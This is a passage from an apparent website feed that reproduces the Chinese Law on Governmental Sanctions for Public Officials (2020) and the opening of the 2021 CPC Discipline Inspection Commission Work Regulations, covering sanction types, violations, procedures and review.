            <tag> 101种职务犯罪 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中华人民共和国公职人员政务处分法（2020年6月20日）</title>
      <link href="/2025/08/10/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%85%AC%E8%81%8C%E4%BA%BA%E5%91%98%E6%94%BF%E5%8A%A1%E5%A4%84%E5%88%86%E6%B3%95%EF%BC%882020%E5%B9%B46%E6%9C%8820%E6%97%A5%EF%BC%89/"/>
      <url>/2025/08/10/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%85%AC%E8%81%8C%E4%BA%BA%E5%91%98%E6%94%BF%E5%8A%A1%E5%A4%84%E5%88%86%E6%B3%95%EF%BC%882020%E5%B9%B46%E6%9C%8820%E6%97%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>2020年6月20日第十三届全国人民代表大会常务委员会第十九次会议通过</p><p><strong>目录</strong></p><p>　　第一章　总则</p><p>　　第二章　政务处分的种类和适用</p><p>　　第三章　违法行为及其适用的政务处分</p><p>　　第四章　政务处分的程序</p><p>　　第五章　复审、复核</p><p>　　第六章　法律责任</p><p>　　第七章　附则</p><h2 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章　总则"></a>第一章　总则</h2><p>　　<strong>第一条</strong>　为了规范政务处分，加强对所有行使公权力的公职人员的监督，促进公职人员依法履职、秉公用权、廉洁从政从业、坚持道德操守，根据《中华人民共和国监察法》，制定本法。</p><p>　　<strong>第二条</strong>　本法适用于监察机关对违法的公职人员给予政务处分的活动。</p><p>　　本法第二章、第三章适用于公职人员任免机关、单位对违法的公职人员给予处分。处分的程序、申诉等适用其他法律、行政法规、国务院部门规章和国家有关规定。</p><p>　　本法所称公职人员，是指《中华人民共和国监察法》第十五条规定的人员。</p><p>　　<strong>第三条</strong>　监察机关应当按照管理权限，加强对公职人员的监督，依法给予违法的公职人员政务处分。</p><p>　　公职人员任免机关、单位应当按照管理权限，加强对公职人员的教育、管理、监督，依法给予违法的公职人员处分。</p><p>　　监察机关发现公职人员任免机关、单位应当给予处分而未给予，或者给予的处分违法、不当的，应当及时提出监察建议。</p><p>　　<strong>第四条</strong>　给予公职人员政务处分，坚持党管干部原则，集体讨论决定；坚持法律面前一律平等，以事实为根据，以法律为准绳，给予的政务处分与违法行为的性质、情节、危害程度相当；坚持惩戒与教育相结合，宽严相济。</p><p>　　<strong>第五条</strong>　给予公职人员政务处分，应当事实清楚、证据确凿、定性准确、处理恰当、程序合法、手续完备。</p><p>　　<strong>第六条</strong>　公职人员依法履行职责受法律保护，非因法定事由、非经法定程序，不受政务处分。</p><h2 id="第二章-政务处分的种类和适用"><a href="#第二章-政务处分的种类和适用" class="headerlink" title="第二章　政务处分的种类和适用"></a>第二章　政务处分的种类和适用</h2><p>　　<strong>第七条</strong>　政务处分的种类为：</p><p>　　（一）警告；</p><p>　　（二）记过；</p><p>　　（三）记大过；</p><p>　　（四）降级；</p><p>　　（五）撤职；</p><p>　　（六）开除。</p><p>　　<strong>第八条</strong>　政务处分的期间为：</p><p>　　（一）警告，六个月；</p><p>　　（二）记过，十二个月；</p><p>　　（三）记大过，十八个月；</p><p>　　（四）降级、撤职，二十四个月。</p><p>　　政务处分决定自作出之日起生效，政务处分期自政务处分决定生效之日起计算。</p><p>　　<strong>第九条</strong>　公职人员二人以上共同违法，根据各自在违法行为中所起的作用和应当承担的法律责任，分别给予政务处分。</p><p>　　<strong>第十条</strong>　有关机关、单位、组织集体作出的决定违法或者实施违法行为的，对负有责任的领导人员和直接责任人员中的公职人员依法给予政务处分。</p><p>　　<strong>第十一条</strong>　公职人员有下列情形之一的，可以从轻或者减轻给予政务处分：</p><p>　　（一）主动交代本人应当受到政务处分的违法行为的；</p><p>　　（二）配合调查，如实说明本人违法事实的；</p><p>　　（三）检举他人违纪违法行为，经查证属实的；</p><p>　　（四）主动采取措施，有效避免、挽回损失或者消除不良影响的；</p><p>　　（五）在共同违法行为中起次要或者辅助作用的；</p><p>　　（六）主动上交或者退赔违法所得的；</p><p>　　（七）法律、法规规定的其他从轻或者减轻情节。</p><p>　　<strong>第十二条</strong>　公职人员违法行为情节轻微，且具有本法第十一条规定的情形之一的，可以对其进行谈话提醒、批评教育、责令检查或者予以诫勉，免予或者不予政务处分。</p><p>　　公职人员因不明真相被裹挟或者被胁迫参与违法活动，经批评教育后确有悔改表现的，可以减轻、免予或者不予政务处分。</p><p>　　<strong>第十三条</strong>　公职人员有下列情形之一的，应当从重给予政务处分：</p><p>　　（一）在政务处分期内再次故意违法，应当受到政务处分的；</p><p>　　（二）阻止他人检举、提供证据的；</p><p>　　（三）串供或者伪造、隐匿、毁灭证据的；</p><p>　　（四）包庇同案人员的；</p><p>　　（五）胁迫、唆使他人实施违法行为的；</p><p>　　（六）拒不上交或者退赔违法所得的；</p><p>　　（七）法律、法规规定的其他从重情节。</p><p>　　<strong>第十四条</strong>　公职人员犯罪，有下列情形之一的，予以开除：</p><p>　　（一）因故意犯罪被判处管制、拘役或者有期徒刑以上刑罚（含宣告缓刑）的；</p><p>　　（二）因过失犯罪被判处有期徒刑，刑期超过三年的；</p><p>　　（三）因犯罪被单处或者并处剥夺政治权利的。</p><p>　　因过失犯罪被判处管制、拘役或者三年以下有期徒刑的，一般应当予以开除；案件情况特殊，予以撤职更为适当的，可以不予开除，但是应当报请上一级机关批准。</p><p>　　公职人员因犯罪被单处罚金，或者犯罪情节轻微，人民检察院依法作出不起诉决定或者人民法院依法免予刑事处罚的，予以撤职；造成不良影响的，予以开除。</p><p>　　<strong>第十五条</strong>　公职人员有两个以上违法行为的，应当分别确定政务处分。应当给予两种以上政务处分的，执行其中最重的政务处分；应当给予撤职以下多个相同政务处分的，可以在一个政务处分期以上、多个政务处分期之和以下确定政务处分期，但是最长不得超过四十八个月。</p><p>　　<strong>第十六条</strong>　对公职人员的同一违法行为，监察机关和公职人员任免机关、单位不得重复给予政务处分和处分。</p><p>　　<strong>第十七条</strong>　公职人员有违法行为，有关机关依照规定给予组织处理的，监察机关可以同时给予政务处分。</p><p>　　<strong>第十八条</strong>　担任领导职务的公职人员有违法行为，被罢免、撤销、免去或者辞去领导职务的，监察机关可以同时给予政务处分。</p><p>　　<strong>第十九条</strong>　公务员以及参照《中华人民共和国公务员法》管理的人员在政务处分期内，不得晋升职务、职级、衔级和级别；其中，被记过、记大过、降级、撤职的，不得晋升工资档次。被撤职的，按照规定降低职务、职级、衔级和级别，同时降低工资和待遇。</p><p>　　<strong>第二十条</strong>　法律、法规授权或者受国家机关依法委托管理公共事务的组织中从事公务的人员，以及公办的教育、科研、文化、医疗卫生、体育等单位中从事管理的人员，在政务处分期内，不得晋升职务、岗位和职员等级、职称；其中，被记过、记大过、降级、撤职的，不得晋升薪酬待遇等级。被撤职的，降低职务、岗位或者职员等级，同时降低薪酬待遇。</p><p>　　<strong>第二十一条</strong>　国有企业管理人员在政务处分期内，不得晋升职务、岗位等级和职称；其中，被记过、记大过、降级、撤职的，不得晋升薪酬待遇等级。被撤职的，降低职务或者岗位等级，同时降低薪酬待遇。</p><p>　　<strong>第二十二条</strong>　基层群众性自治组织中从事管理的人员有违法行为的，监察机关可以予以警告、记过、记大过。</p><p>　　基层群众性自治组织中从事管理的人员受到政务处分的，应当由县级或者乡镇人民政府根据具体情况减发或者扣发补贴、奖金。</p><p>　　<strong>第二十三条</strong>　《中华人民共和国监察法》第十五条第六项规定的人员有违法行为的，监察机关可以予以警告、记过、记大过。情节严重的，由所在单位直接给予或者监察机关建议有关机关、单位给予降低薪酬待遇、调离岗位、解除人事关系或者劳动关系等处理。</p><p>　　《中华人民共和国监察法》第十五条第二项规定的人员，未担任公务员、参照《中华人民共和国公务员法》管理的人员、事业单位工作人员或者国有企业人员职务的，对其违法行为依照前款规定处理。</p><p>　　<strong>第二十四条</strong>　公职人员被开除，或者依照本法第二十三条规定，受到解除人事关系或者劳动关系处理的，不得录用为公务员以及参照《中华人民共和国公务员法》管理的人员。</p><p>　　<strong>第二十五条</strong>　公职人员违法取得的财物和用于违法行为的本人财物，除依法应当由其他机关没收、追缴或者责令退赔的，由监察机关没收、追缴或者责令退赔；应当退还原所有人或者原持有人的，依法予以退还；属于国家财产或者不应当退还以及无法退还的，上缴国库。</p><p>　　公职人员因违法行为获得的职务、职级、衔级、级别、岗位和职员等级、职称、待遇、资格、学历、学位、荣誉、奖励等其他利益，监察机关应当建议有关机关、单位、组织按规定予以纠正。</p><p>　　<strong>第二十六条</strong>　公职人员被开除的，自政务处分决定生效之日起，应当解除其与所在机关、单位的人事关系或者劳动关系。</p><p>　　公职人员受到开除以外的政务处分，在政务处分期内有悔改表现，并且没有再发生应当给予政务处分的违法行为的，政务处分期满后自动解除，晋升职务、职级、衔级、级别、岗位和职员等级、职称、薪酬待遇不再受原政务处分影响。但是，解除降级、撤职的，不恢复原职务、职级、衔级、级别、岗位和职员等级、职称、薪酬待遇。</p><p>　　<strong>第二十七条</strong>　已经退休的公职人员退休前或者退休后有违法行为的，不再给予政务处分，但是可以对其立案调查；依法应当予以降级、撤职、开除的，应当按照规定相应调整其享受的待遇，对其违法取得的财物和用于违法行为的本人财物依照本法第二十五条的规定处理。</p><p>　　已经离职或者死亡的公职人员在履职期间有违法行为的，依照前款规定处理。</p><h2 id="第三章-违法行为及其适用的政务处分"><a href="#第三章-违法行为及其适用的政务处分" class="headerlink" title="第三章　违法行为及其适用的政务处分"></a>第三章　违法行为及其适用的政务处分</h2><p>　　<strong>第二十八条</strong>　有下列行为之一的，予以记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p><p>　　（一）散布有损宪法权威、中国共产党领导和国家声誉的言论的；</p><p>　　（二）参加旨在反对宪法、中国共产党领导和国家的集会、游行、示威等活动的；</p><p>　　（三）拒不执行或者变相不执行中国共产党和国家的路线方针政策、重大决策部署的；</p><p>　　（四）参加非法组织、非法活动的；</p><p>　　（五）挑拨、破坏民族关系，或者参加民族分裂活动的；</p><p>　　（六）利用宗教活动破坏民族团结和社会稳定的；</p><p>　　（七）在对外交往中损害国家荣誉和利益的。</p><p>　　有前款第二项、第四项、第五项和第六项行为之一的，对策划者、组织者和骨干分子，予以开除。</p><p>　　公开发表反对宪法确立的国家指导思想，反对中国共产党领导，反对社会主义制度，反对改革开放的文章、演说、宣言、声明等的，予以开除。</p><p>　　<strong>第二十九条</strong>　不按照规定请示、报告重大事项，情节较重的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职。</p><p>　　违反个人有关事项报告规定，隐瞒不报，情节较重的，予以警告、记过或者记大过。</p><p>　　篡改、伪造本人档案资料的，予以记过或者记大过；情节严重的，予以降级或者撤职。</p><p>　　<strong>第三十条</strong>　有下列行为之一的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职：</p><p>　　（一）违反民主集中制原则，个人或者少数人决定重大事项，或者拒不执行、擅自改变集体作出的重大决定的；</p><p>　　（二）拒不执行或者变相不执行、拖延执行上级依法作出的决定、命令的。</p><p>　　<strong>第三十一条</strong>　违反规定出境或者办理因私出境证件的，予以记过或者记大过；情节严重的，予以降级或者撤职。</p><p>　　违反规定取得外国国籍或者获取境外永久居留资格、长期居留许可的，予以撤职或者开除。</p><p>　　<strong>第三十二条</strong>　有下列行为之一的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p><p>　　（一）在选拔任用、录用、聘用、考核、晋升、评选等干部人事工作中违反有关规定的；</p><p>　　（二）弄虚作假，骗取职务、职级、衔级、级别、岗位和职员等级、职称、待遇、资格、学历、学位、荣誉、奖励或者其他利益的；</p><p>　　（三）对依法行使批评、申诉、控告、检举等权利的行为进行压制或者打击报复的；</p><p>　　（四）诬告陷害，意图使他人受到名誉损害或者责任追究等不良影响的；</p><p>　　（五）以暴力、威胁、贿赂、欺骗等手段破坏选举的。</p><p>　　<strong>第三十三条</strong>　有下列行为之一的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p><p>　　（一）贪污贿赂的；</p><p>　　（二）利用职权或者职务上的影响为本人或者他人谋取私利的；</p><p>　　（三）纵容、默许特定关系人利用本人职权或者职务上的影响谋取私利的。</p><p>　　拒不按照规定纠正特定关系人违规任职、兼职或者从事经营活动，且不服从职务调整的，予以撤职。</p><p>　　<strong>第三十四条</strong>　收受可能影响公正行使公权力的礼品、礼金、有价证券等财物的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除。</p><p>　　向公职人员及其特定关系人赠送可能影响公正行使公权力的礼品、礼金、有价证券等财物，或者接受、提供可能影响公正行使公权力的宴请、旅游、健身、娱乐等活动安排，情节较重的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职。</p><p>　　<strong>第三十五条</strong>　有下列行为之一，情节较重的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职：</p><p>　　（一）违反规定设定、发放薪酬或者津贴、补贴、奖金的；</p><p>　　（二）违反规定，在公务接待、公务交通、会议活动、办公用房以及其他工作生活保障等方面超标准、超范围的；</p><p>　　（三）违反规定公款消费的。</p><p>　　<strong>第三十六条</strong>　违反规定从事或者参与营利性活动，或者违反规定兼任职务、领取报酬的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除。</p><p>　　<strong>第三十七条</strong>　利用宗族或者黑恶势力等欺压群众，或者纵容、包庇黑恶势力活动的，予以撤职；情节严重的，予以开除。</p><p>　　<strong>第三十八条</strong>　有下列行为之一，情节较重的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职：</p><p>　　（一）违反规定向管理服务对象收取、摊派财物的；</p><p>　　（二）在管理服务活动中故意刁难、吃拿卡要的；</p><p>　　（三）在管理服务活动中态度恶劣粗暴，造成不良后果或者影响的；</p><p>　　（四）不按照规定公开工作信息，侵犯管理服务对象知情权，造成不良后果或者影响的；</p><p>　　（五）其他侵犯管理服务对象利益的行为，造成不良后果或者影响的。</p><p>　　有前款第一项、第二项和第五项行为，情节特别严重的，予以开除。</p><p>　　<strong>第三十九条</strong>　有下列行为之一，造成不良后果或者影响的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p><p>　　（一）滥用职权，危害国家利益、社会公共利益或者侵害公民、法人、其他组织合法权益的；</p><p>　　（二）不履行或者不正确履行职责，玩忽职守，贻误工作的；</p><p>　　（三）工作中有形式主义、官僚主义行为的；</p><p>　　（四）工作中有弄虚作假，误导、欺骗行为的；</p><p>　　（五）泄露国家秘密、工作秘密，或者泄露因履行职责掌握的商业秘密、个人隐私的。</p><p>　　<strong>第四十条</strong>　有下列行为之一的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p><p>　　（一）违背社会公序良俗，在公共场所有不当行为，造成不良影响的；</p><p>　　（二）参与或者支持迷信活动，造成不良影响的；</p><p>　　（三）参与赌博的；</p><p>　　（四）拒不承担赡养、抚养、扶养义务的；</p><p>　　（五）实施家庭暴力，虐待、遗弃家庭成员的；</p><p>　　（六）其他严重违反家庭美德、社会公德的行为。</p><p>　　吸食、注射毒品，组织赌博，组织、支持、参与卖淫、嫖娼、色情淫乱活动的，予以撤职或者开除。</p><p>　　<strong>第四十一条</strong>　公职人员有其他违法行为，影响公职人员形象，损害国家和人民利益的，可以根据情节轻重给予相应政务处分。</p><h2 id="第四章-政务处分的程序"><a href="#第四章-政务处分的程序" class="headerlink" title="第四章　政务处分的程序"></a>第四章　政务处分的程序</h2><p>　　<strong>第四十二条</strong>　监察机关对涉嫌违法的公职人员进行调查，应当由二名以上工作人员进行。监察机关进行调查时，有权依法向有关单位和个人了解情况，收集、调取证据。有关单位和个人应当如实提供情况。</p><p>　　严禁以威胁、引诱、欺骗及其他非法方式收集证据。以非法方式收集的证据不得作为给予政务处分的依据。</p><p>　　<strong>第四十三条</strong>　作出政务处分决定前，监察机关应当将调查认定的违法事实及拟给予政务处分的依据告知被调查人，听取被调查人的陈述和申辩，并对其陈述的事实、理由和证据进行核实，记录在案。被调查人提出的事实、理由和证据成立的，应予采纳。不得因被调查人的申辩而加重政务处分。</p><p>　　<strong>第四十四条</strong>　调查终结后，监察机关应当根据下列不同情况，分别作出处理：</p><p>　　（一）确有应受政务处分的违法行为的，根据情节轻重，按照政务处分决定权限，履行规定的审批手续后，作出政务处分决定；</p><p>　　（二）违法事实不能成立的，撤销案件；</p><p>　　（三）符合免予、不予政务处分条件的，作出免予、不予政务处分决定；</p><p>　　（四）被调查人涉嫌其他违法或者犯罪行为的，依法移送主管机关处理。</p><p>　　<strong>第四十五条</strong>　决定给予政务处分的，应当制作政务处分决定书。</p><p>　　政务处分决定书应当载明下列事项：</p><p>　　（一）被处分人的姓名、工作单位和职务；</p><p>　　（二）违法事实和证据；</p><p>　　（三）政务处分的种类和依据；</p><p>　　（四）不服政务处分决定，申请复审、复核的途径和期限；</p><p>　　（五）作出政务处分决定的机关名称和日期。</p><p>　　政务处分决定书应当盖有作出决定的监察机关的印章。</p><p>　　<strong>第四十六条</strong>　政务处分决定书应当及时送达被处分人和被处分人所在机关、单位，并在一定范围内宣布。</p><p>　　作出政务处分决定后，监察机关应当根据被处分人的具体身份书面告知相关的机关、单位。</p><p>　　<strong>第四十七条</strong>　参与公职人员违法案件调查、处理的人员有下列情形之一的，应当自行回避，被调查人、检举人及其他有关人员也有权要求其回避：</p><p>　　（一）是被调查人或者检举人的近亲属的；</p><p>　　（二）担任过本案的证人的；</p><p>　　（三）本人或者其近亲属与调查的案件有利害关系的；</p><p>　　（四）可能影响案件公正调查、处理的其他情形。</p><p>　　<strong>第四十八条</strong>　监察机关负责人的回避，由上级监察机关决定；其他参与违法案件调查、处理人员的回避，由监察机关负责人决定。</p><p>　　监察机关或者上级监察机关发现参与违法案件调查、处理人员有应当回避情形的，可以直接决定该人员回避。</p><p>　　<strong>第四十九条</strong>　公职人员依法受到刑事责任追究的，监察机关应当根据司法机关的生效判决、裁定、决定及其认定的事实和情节，依照本法规定给予政务处分。</p><p>　　公职人员依法受到行政处罚，应当给予政务处分的，监察机关可以根据行政处罚决定认定的事实和情节，经立案调查核实后，依照本法给予政务处分。</p><p>　　监察机关根据本条第一款、第二款的规定作出政务处分后，司法机关、行政机关依法改变原生效判决、裁定、决定等，对原政务处分决定产生影响的，监察机关应当根据改变后的判决、裁定、决定等重新作出相应处理。</p><p>　　<strong>第五十条</strong>　监察机关对经各级人民代表大会、县级以上各级人民代表大会常务委员会选举或者决定任命的公职人员予以撤职、开除的，应当先依法罢免、撤销或者免去其职务，再依法作出政务处分决定。</p><p>　　监察机关对经中国人民政治协商会议各级委员会全体会议或者其常务委员会选举或者决定任命的公职人员予以撤职、开除的，应当先依章程免去其职务，再依法作出政务处分决定。</p><p>　　监察机关对各级人民代表大会代表、中国人民政治协商会议各级委员会委员给予政务处分的，应当向有关的人民代表大会常务委员会，乡、民族乡、镇的人民代表大会主席团或者中国人民政治协商会议委员会常务委员会通报。</p><p>　　<strong>第五十一条</strong>　下级监察机关根据上级监察机关的指定管辖决定进行调查的案件，调查终结后，对不属于本监察机关管辖范围内的监察对象，应当交有管理权限的监察机关依法作出政务处分决定。</p><p>　　<strong>第五十二条</strong>　公职人员涉嫌违法，已经被立案调查，不宜继续履行职责的，公职人员任免机关、单位可以决定暂停其履行职务。</p><p>　　公职人员在被立案调查期间，未经监察机关同意，不得出境、辞去公职；被调查公职人员所在机关、单位及上级机关、单位不得对其交流、晋升、奖励、处分或者办理退休手续。</p><p>　　<strong>第五十三条</strong>　监察机关在调查中发现公职人员受到不实检举、控告或者诬告陷害，造成不良影响的，应当按照规定及时澄清事实，恢复名誉，消除不良影响。</p><p>　　<strong>第五十四条</strong>　公职人员受到政务处分的，应当将政务处分决定书存入其本人档案。对于受到降级以上政务处分的，应当由人事部门按照管理权限在作出政务处分决定后一个月内办理职务、工资及其他有关待遇等的变更手续；特殊情况下，经批准可以适当延长办理期限，但是最长不得超过六个月。</p><h2 id="第五章-复审、复核"><a href="#第五章-复审、复核" class="headerlink" title="第五章　复审、复核"></a>第五章　复审、复核</h2><p>　　<strong>第五十五条</strong>　公职人员对监察机关作出的涉及本人的政务处分决定不服的，可以依法向作出决定的监察机关申请复审；公职人员对复审决定仍不服的，可以向上一级监察机关申请复核。</p><p>　　监察机关发现本机关或者下级监察机关作出的政务处分决定确有错误的，应当及时予以纠正或者责令下级监察机关及时予以纠正。</p><p>　　<strong>第五十六条</strong>　复审、复核期间，不停止原政务处分决定的执行。</p><p>　　公职人员不因提出复审、复核而被加重政务处分。</p><p>　　<strong>第五十七条</strong>　有下列情形之一的，复审、复核机关应当撤销原政务处分决定，重新作出决定或者责令原作出决定的监察机关重新作出决定：</p><p>　　（一）政务处分所依据的违法事实不清或者证据不足的；</p><p>　　（二）违反法定程序，影响案件公正处理的；</p><p>　　（三）超越职权或者滥用职权作出政务处分决定的。</p><p>　　<strong>第五十八条</strong>　有下列情形之一的，复审、复核机关应当变更原政务处分决定，或者责令原作出决定的监察机关予以变更：</p><p>　　（一）适用法律、法规确有错误的；</p><p>　　（二）对违法行为的情节认定确有错误的；</p><p>　　（三）政务处分不当的。</p><p>　　<strong>第五十九条</strong>　复审、复核机关认为政务处分决定认定事实清楚，适用法律正确的，应当予以维持。</p><p>　　<strong>第六十条</strong>　公职人员的政务处分决定被变更，需要调整该公职人员的职务、职级、衔级、级别、岗位和职员等级或者薪酬待遇等的，应当按照规定予以调整。政务处分决定被撤销的，应当恢复该公职人员的级别、薪酬待遇，按照原职务、职级、衔级、岗位和职员等级安排相应的职务、职级、衔级、岗位和职员等级，并在原政务处分决定公布范围内为其恢复名誉。没收、追缴财物错误的，应当依法予以返还、赔偿。</p><p>　　公职人员因有本法第五十七条、第五十八条规定的情形被撤销政务处分或者减轻政务处分的，应当对其薪酬待遇受到的损失予以补偿。</p><h2 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章　法律责任"></a>第六章　法律责任</h2><p>　　<strong>第六十一条</strong>　有关机关、单位无正当理由拒不采纳监察建议的，由其上级机关、主管部门责令改正，对该机关、单位给予通报批评，对负有责任的领导人员和直接责任人员依法给予处理。</p><p>　　<strong>第六十二条</strong>　有关机关、单位、组织或者人员有下列情形之一的，由其上级机关，主管部门，任免机关、单位或者监察机关责令改正，依法给予处理：</p><p>　　（一）拒不执行政务处分决定的；</p><p>　　（二）拒不配合或者阻碍调查的；</p><p>　　（三）对检举人、证人或者调查人员进行打击报复的；</p><p>　　（四）诬告陷害公职人员的；</p><p>　　（五）其他违反本法规定的情形。</p><p>　　<strong>第六十三条</strong>　监察机关及其工作人员有下列情形之一的，对负有责任的领导人员和直接责任人员依法给予处理：</p><p>　　（一）违反规定处置问题线索的；</p><p>　　（二）窃取、泄露调查工作信息，或者泄露检举事项、检举受理情况以及检举人信息的；</p><p>　　（三）对被调查人或者涉案人员逼供、诱供，或者侮辱、打骂、虐待、体罚或者变相体罚的；</p><p>　　（四）收受被调查人或者涉案人员的财物以及其他利益的；</p><p>　　（五）违反规定处置涉案财物的；</p><p>　　（六）违反规定采取调查措施的；</p><p>　　（七）利用职权或者职务上的影响干预调查工作、以案谋私的；</p><p>　　（八）违反规定发生办案安全事故，或者发生安全事故后隐瞒不报、报告失实、处置不当的；</p><p>　　（九）违反回避等程序规定，造成不良影响的；</p><p>　　（十）不依法受理和处理公职人员复审、复核的；</p><p>　　（十一）其他滥用职权、玩忽职守、徇私舞弊的行为。</p><p>　　<strong>第六十四条</strong>　违反本法规定，构成犯罪的，依法追究刑事责任。</p><h2 id="第七章-附则"><a href="#第七章-附则" class="headerlink" title="第七章　附则"></a>第七章　附则</h2><p>　　<strong>第六十五条</strong>　国务院及其相关主管部门根据本法的原则和精神，结合事业单位、国有企业等的实际情况，对事业单位、国有企业等的违法的公职人员处分事宜作出具体规定。</p><p>　　<strong>第六十六条</strong>　中央军事委员会可以根据本法制定相关具体规定。</p><p>　　<strong>第六十七条</strong>　本法施行前，已结案的案件如果需要复审、复核，适用当时的规定。尚未结案的案件，如果行为发生时的规定不认为是违法的，适用当时的规定；如果行为发生时的规定认为是违法的，依照当时的规定处理，但是如果本法不认为是违法或者根据本法处理较轻的，适用本法。</p><p>　　<strong>第六十八条</strong>　本法自2020年7月1日起施行。</p>]]></content>
      
      
      <categories>
          
          <category> 法规 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 政务处分 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国共产党纪律检查委员会工作条例（2021年12月24日）</title>
      <link href="/2025/08/03/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%BA%AA%E5%BE%8B%E6%A3%80%E6%9F%A5%E5%A7%94%E5%91%98%E4%BC%9A%E5%B7%A5%E4%BD%9C%E6%9D%A1%E4%BE%8B%EF%BC%882021%E5%B9%B412%E6%9C%8824%E6%97%A5%EF%BC%89/"/>
      <url>/2025/08/03/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%BA%AA%E5%BE%8B%E6%A3%80%E6%9F%A5%E5%A7%94%E5%91%98%E4%BC%9A%E5%B7%A5%E4%BD%9C%E6%9D%A1%E4%BE%8B%EF%BC%882021%E5%B9%B412%E6%9C%8824%E6%97%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>（2021年12月6日中共中央政治局会议审议批准 2021年12月 24 日中共中央发布）</p><h2 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章　总则"></a>第一章　总则</h2><p>  <strong>第一条</strong>　为了加强和规范新时代党的纪律检查委员会工作，根据《中国共产党章程》，制定本条例。</p><p>  <strong>第二条</strong>　党的各级纪律检查委员会高举中国特色社会主义伟大旗帜，以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想为指导，增强“四个意识”、坚定“四个自信”、做到“两个维护”，不忘初心、牢记使命，深入贯彻全面从严治党战略方针，坚定不移推进党风廉政建设和反腐败斗争，构建一体推进不敢腐、不能腐、不想腐体制机制，从严从实加强自身建设，自觉接受监督，充分发挥监督保障执行、促进完善发展作用。</p><p>  <strong>第三条</strong>　党的各级纪律检查委员会是党内监督专责机关，是党推进全面从严治党、开展党风廉政建设和反腐败斗争的专门力量。</p><p>  党的各级纪律检查委员会的主要任务是：维护党的章程和其他党内法规，检查党的理论和路线方针政策、党中央决策部署执行情况，协助党的委员会推进全面从严治党、加强党风建设和组织协调反腐败工作。</p><p>  党的各级纪律检查委员会把坚决维护习近平总书记党中央的核心、全党的核心地位，维护党中央权威和集中统一领导作为最高政治原则和根本政治责任。</p><p>  <strong>第四条</strong>　党的各级纪律检查委员会遵循以下原则开展工作：</p><p>  （一）坚持党的全面领导，坚持党中央集中统一领导。</p><p>  （二）坚持以人民为中心，践行党的根本宗旨和群众路线。</p><p>  （三）坚持民主集中制，实行集体领导和个人分工负责相结合的制度。</p><p>  （四）坚持严的主基调，全面从严、一严到底。</p><p>  （五）坚持实事求是，依规依纪依法履行职责。</p><p>  （六）坚持惩前毖后、治病救人，实现政治效果、纪法效果、社会效果有机统一。</p><h2 id="第二章-领导体制"><a href="#第二章-领导体制" class="headerlink" title="第二章　领导体制"></a>第二章　领导体制</h2><p>  <strong>第五条</strong>　党的中央纪律检查委员会（国家监察委员会）在党中央领导下进行工作，履行党的最高纪律检查机关（国家最高监察机关）职责。</p><p>  党的中央纪律检查委员会严格执行加强和维护党中央集中统一领导的各项制度要求，及时向中央政治局、中央政治局常务委员会请示汇报工作，研究重大事项、重要问题以及作出立案审查决定、给予党纪处分等事项向党中央请示报告。执行党中央重要决定的情况应当专题报告。</p><p>  <strong>第六条</strong>　党的地方各级纪律检查委员会和基层纪律检查委员会在同级党的委员会和上级纪律检查委员会双重领导下进行工作。</p><p>  党的地方各级纪律检查委员会和基层纪律检查委员会应当落实同级党的委员会推进全面从严治党、加强党风廉政建设和反腐败工作的部署，执行同级党委作出的决定，及时向同级党委汇报工作，按照规定请示报告重大事项。</p><p>  上级党的纪律检查委员会加强对下级纪律检查委员会的领导，对下级纪委的工作作出部署、提出要求；督促指导和支持下级纪委开展同级监督，检查下级纪委的工作，定期听取工作汇报，开展政治和业务培训；坚持查办腐败案件以上级纪委领导为主，按照规定审议和批准下级纪委关于线索处置、立案审查、纪律处分等的请示报告，按照程序改变下级纪委作出的错误或者不当的决定，必要时直接审查或者组织、指挥审查下级纪委管辖范围内有重大影响或者复杂的案件。</p><p>  <strong>第七条</strong>　党的中央纪律检查委员会与国家监察委员会合署办公，党的地方各级纪律检查委员会与地方各级监察委员会合署办公，实行一套工作机构、两个机关名称，履行党的纪律检查和国家监察两项职责，实现纪委监委领导体制和工作机制的统一融合，集中决策、一体运行，坚持纪严于法，执纪执法贯通。</p><h2 id="第三章-产生和运行"><a href="#第三章-产生和运行" class="headerlink" title="第三章　产生和运行"></a>第三章　产生和运行</h2><p>  <strong>第八条</strong>　党的中央纪律检查委员会由党的全国代表大会选举产生，每届任期和党的中央委员会任期相同。</p><p>  党的中央纪律检查委员会全体会议，选举常务委员会和书记、副书记，并报党的中央委员会批准。</p><p>  <strong>第九条</strong>　中央纪律检查委员会委员应当政治坚定、对党忠诚、敢于斗争、担当作为、清正廉洁，具备组织领导纪律检查工作、推进党风廉政建设和反腐败斗争的能力。</p><p>  中央纪律检查委员会委员应当认真履行以下职责：</p><p>  （一）参加中央纪委全体会议，积极发表意见、提出建议。</p><p>  （二）在纪律检查机关担负具体工作的委员，应当模范履行岗位职责，高质量完成所承担的纪律检查工作。</p><p>  